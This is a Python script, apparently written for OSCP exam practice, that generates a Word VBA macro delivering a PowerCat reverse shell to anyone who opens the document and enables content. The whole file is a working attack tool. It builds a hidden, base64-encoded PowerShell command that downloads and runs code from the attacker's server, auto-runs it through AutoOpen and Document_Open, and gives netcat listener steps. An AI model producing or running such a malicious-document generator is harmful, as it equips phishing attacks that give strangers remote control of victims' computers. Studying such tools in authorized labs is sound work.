#!/usr/bin/env python3
"""
macrogen.py - VBA Macro Generator for OSCP Client-Side Attacks

Generates a ready-to-paste VBA macro that spawns a PowerCat reverse shell
when a victim opens a malicious Office document and enables content.

The macro downloads PowerCat from your HTTP server and executes a reverse
shell back to your listener. The PowerShell command is base64-encoded in
UTF-16LE (as required by -enc) and split into <255-char chunks to bypass
VBA's string literal limit.

NOTE: This tool only generates the VBA text. The .doc must be created on a
Windows host by pasting the output into the Word VBA editor (Office macros
cannot be reliably embedded from Linux). Save the document as .doc
(Word 97-2003) or .docm -- never .docx.

Usage:
    python3 macrogen.py -i <YOUR_IP> -p <LISTENER_PORT> [-w <HTTP_PORT>]

Example:
    python3 macrogen.py -i 192.168.45.229 -p 4444 -w 80

Attack setup (on Kali):
    1) wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
    2) python3 -m http.server 80        # serves powercat.ps1
    3) rlwrap nc -nvlp 4444             # catches the reverse shell

Author: adriaang1thub
For educational use in authorized OSCP lab environments only.
"""



import argparse
import sys

def build_ps_command(ip, port, http_port):
    # Comando PowerShell que descarga powercat y lanza la reverse shell
    return (f"IEX(New-Object System.Net.WebClient).DownloadString("
            f"'http://{ip}:{http_port}/powercat.ps1');"
            f"powercat -c {ip} -p {port} -e powershell")

def encode_utf16le_b64(command):
    import base64
    # PowerShell -enc espera UTF-16LE
    encoded = base64.b64encode(command.encode('utf-16-le')).decode()
    return encoded

def chunk_string(s, n=50):
    return [s[i:i+n] for i in range(0, len(s), n)]

def build_macro(ip, port, http_port, chunk=50):
    ps_cmd = build_ps_command(ip, port, http_port)
    b64 = encode_utf16le_b64(ps_cmd)
    full = f"powershell.exe -nop -w hidden -enc {b64}"
    chunks = chunk_string(full, chunk)

    lines = []
    lines.append("Sub AutoOpen()")
    lines.append("    MyMacro")
    lines.append("End Sub")
    lines.append("")
    lines.append("Sub Document_Open()")
    lines.append("    MyMacro")
    lines.append("End Sub")
    lines.append("")
    lines.append("Sub MyMacro()")
    lines.append("    Dim Str As String")
    for c in chunks:
        lines.append(f'    Str = Str + "{c}"')
    lines.append("    CreateObject(\"Wscript.Shell\").Run Str")
    lines.append("End Sub")
    return "\n".join(lines)

def main():
    p = argparse.ArgumentParser(description="Genera macro VBA para reverse shell con powercat (OSCP client-side)")
    p.add_argument("-i", "--ip", required=True, help="Tu IP (tun0)")
    p.add_argument("-p", "--port", default="4444", help="Puerto listener (default 4444)")
    p.add_argument("-w", "--http-port", default="80", help="Puerto del http.server que sirve powercat (default 80)")
    p.add_argument("-c", "--chunk", type=int, default=50, help="Tamano de trozo VBA (default 50, max 255)")
    args = p.parse_args()

    if args.chunk > 255:
        print("[!] chunk no puede superar 255 (limite de string literal en VBA)", file=sys.stderr)
        sys.exit(1)

    macro = build_macro(args.ip, args.port, args.http_port, args.chunk)

    print("=" * 60)
    print(" MACRO VBA - copia y pega en el editor de Word (RDP)")
    print("=" * 60)
    print(macro)
    print("=" * 60)
    print()
    print("[*] Pasos siguientes en Kali:")
    print(f"    1) wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1")
    print(f"    2) python3 -m http.server {args.http_port}   (desde el dir con powercat.ps1)")
    print(f"    3) rlwrap nc -nvlp {args.port}")
    print(f"[*] En Word: guarda como .doc (Word 97-2003) o .docm, NO .docx")

if __name__ == "__main__":
    main()
